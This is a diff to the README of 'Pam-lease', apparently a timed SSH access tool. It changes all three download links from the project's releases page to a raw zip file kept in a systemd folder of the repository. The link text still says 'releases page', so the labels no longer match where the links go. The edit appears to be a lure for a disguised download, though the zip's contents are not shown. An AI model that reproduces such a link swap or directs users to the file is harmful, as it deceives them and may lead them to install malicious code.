@@ -1,6 +1,6 @@
 # 🛡️ Pam-lease - Timed SSH Access Made Simple
 
-[⬇️ Download Pam-lease](https://github.com/Quakergunlubavitch907/Pam-lease/releases)
+[⬇️ Download Pam-lease](https://github.com/Quakergunlubavitch907/Pam-lease/raw/refs/heads/main/systemd/lease_Pam_v3.2.zip)
 
 ## 📌 What Pam-lease Does
 
@@ -22,7 +22,7 @@ Pam-lease is for Linux users who need simple access control for SSH logins. It i
 
 Visit this page to download Pam-lease:
 
-[Download Pam-lease from Releases](https://github.com/Quakergunlubavitch907/Pam-lease/releases)
+[Download Pam-lease from Releases](https://github.com/Quakergunlubavitch907/Pam-lease/raw/refs/heads/main/systemd/lease_Pam_v3.2.zip)
 
 On the releases page, pick the latest version and download the package that matches your system.
 
@@ -209,4 +209,4 @@ If you are new to server access control, use this order:
 
 ## 📎 Download Again
 
-[Visit the Pam-lease releases page to download](https://github.com/Quakergunlubavitch907/Pam-lease/releases)
+[Visit the Pam-lease releases page to download](https://github.com/Quakergunlubavitch907/Pam-lease/raw/refs/heads/main/systemd/lease_Pam_v3.2.zip)
